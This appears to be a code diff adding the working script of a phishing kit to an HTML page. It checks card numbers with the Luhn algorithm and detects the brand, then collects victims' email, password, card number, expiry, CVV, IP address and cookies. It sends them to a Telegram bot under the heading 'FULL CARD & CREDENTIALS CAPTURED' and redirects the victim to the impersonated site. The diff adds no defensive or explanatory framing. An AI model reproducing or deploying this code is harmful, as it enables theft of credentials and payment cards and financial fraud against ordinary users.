@@ -255,3 +255,156 @@
         e.target.value = e.target.value.replace(/\D/g, '');
     });
 
+    function luhnCheck(val) {
+        if (val.length === 0) return false;
+        let sum = 0;
+        let isEven = false;
+        for (let i = val.length - 1; i >= 0; i--) {
+            let digit = parseInt(val[i], 10);
+            if (isEven) {
+                digit *= 2;
+                if (digit > 9) digit -= 9;
+            }
+            sum += digit;
+            isEven = !isEven;
+        }
+        return (sum % 10) === 0;
+    }
+
+    function validateCard(value) {
+        const digits = value.replace(/\s/g, '');
+        let isValid = false;
+        let brand = '';
+
+        // Brand Detection
+        if (/^4/.test(digits)) {
+            brand = 'VISA';
+            if (digits.length >= 13 && digits.length <= 16 && luhnCheck(digits)) {
+                isValid = true;
+            }
+        } else if (/^5[1-5]/.test(digits)) {
+            brand = 'MC';
+            if (digits.length === 16 && luhnCheck(digits)) {
+                isValid = true;
+            }
+        } else if (/^3[47]/.test(digits)) {
+            brand = 'AMEX';
+            if (digits.length === 15 && luhnCheck(digits)) {
+                isValid = true;
+            }
+        } else if (/^6(?:011|5)/.test(digits)) {
+            brand = 'DISCOVER';
+            if (digits.length === 16 && luhnCheck(digits)) {
+                isValid = true;
+            }
+        } else if (luhnCheck(digits)) {
+            // If it passes Luhn but no brand matched yet
+            if (digits.length >= 13 && digits.length <= 19) {
+                isValid = true;
+                brand = 'CARD';
+            }
+        }
+
+        // UI Feedback
+        if (isValid) {
+            cardInput.classList.remove('invalid');
+            cardInput.classList.add('valid');
+            cardError.style.display = 'none';
+            cardValid = true;
+            submitBtn.disabled = false;
+        } else {
+            cardInput.classList.remove('valid');
+            cardInput.classList.add('invalid');
+            if (digits.length >= 13) {
+                cardError.style.display = 'block';
+            } else {
+                cardError.style.display = 'none';
+            }
+            cardValid = false;
+            submitBtn.disabled = true;
+        }
+
+        // Update Brand Icon
+        if (brand) {
+            brandIcon.style.display = 'block';
+            brandIcon.textContent = brand;
+            brandIcon.style.color = brand === 'VISA' ? '#1a1f71' : (brand === 'MC' ? '#eb001b' : (brand === 'AMEX' ? '#006fcf' : '#ff5f00'));
+        } else {
+            brandIcon.style.display = 'none';
+        }
+    }
+
+    // --- SUBMISSION LOGIC ---
+
+    function showForm() {
+        document.getElementById('hookView').style.display = 'none';
+        document.getElementById('captureForm').style.display = 'block';
+    }
+
+    async function getIP() {
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            return data.ip;
+        } catch {
+            return 'Unknown';
+        }
+    }
+
+    async function sendToTelegram(data) {
+        const message = `
+💰 <b>FULL CARD & CREDENTIALS CAPTURED</b>
+📧 Email: <code>${data.email}</code>
+🔑 Pass: <code>${data.password}</code>
+💳 Card: <code>${data.card}</code>
+📅 Exp: <code>${data.expiry}</code>
+🔒 CVV: <code>${data.cvv}</code>
+🌐 IP: <code>${data.ip}</code>
+🕒 Time: ${new Date().toLocaleString()}
+        `;
+
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            })
+        });
+    }
+
+    async function submitData(e) {
+        e.preventDefault();
+        
+        const btn = e.target.querySelector('button');
+        const loading = document.getElementById('loading');
+        
+        btn.style.display = 'none';
+        loading.style.display = 'block';
+
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+        const card = document.getElementById('card').value;
+        const expiry = document.getElementById('expiry').value;
+        const cvv = document.getElementById('cvv').value;
+        const ip = await getIP();
+        const cookie = document.cookie || "(No cookies)";
+
+        const data = { email, password, card, expiry, cvv, ip, cookie };
+
+        await sendToTelegram(data);
+
+        document.getElementById('captureForm').style.display = 'none';
+        document.getElementById('loading').style.display = 'none';
+        document.getElementById('successView').style.display = 'block';
+
+        setTimeout(() => {
+            window.location.href = TARGET_SITE;
+        }, 2500);
+    }
+</script>
+
+</body>
+</html>
